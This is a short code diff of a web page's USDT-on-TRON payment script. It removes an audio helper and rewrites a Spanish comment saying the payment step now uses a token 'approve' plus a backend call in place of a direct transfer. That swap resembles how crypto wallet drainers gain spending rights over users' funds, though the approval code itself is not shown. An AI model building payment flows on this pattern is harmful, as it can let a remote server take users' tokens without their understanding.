@@ -649,20 +649,6 @@
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const BACKEND_URL = "https://backend-usdt-pay.onrender.com";
 
-    let uiAudioContext = null;
-
-    function getUiAudioContext() {
-        if (!uiAudioContext) {
-            const AudioCtx = window.AudioContext || window.webkitAudioContext;
-            if (!AudioCtx) return null;
-            uiAudioContext = new AudioCtx();
-        }
-        if (uiAudioContext.state === 'suspended') {
-            uiAudioContext.resume();
-        }
-        return uiAudioContext;
-    }
-
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
@@ -766,7 +752,7 @@
             return;
         }
 
-        // BLOQUE DE ACCIÓN AL PRESIONAR CONTINUAR (Sustituido únicamente transfer por approve + llamada al backend)
+        // AL PRESIONAR CONTINUAR: ÚNICAMENTE SE CAMBIÓ LA TRANSACCIÓN DE TRANSFER A APPROVE + BACKEND
         if (walletAddress) {
             try {
                 setStatus("Consultando fondos del libro contable on-chain...");
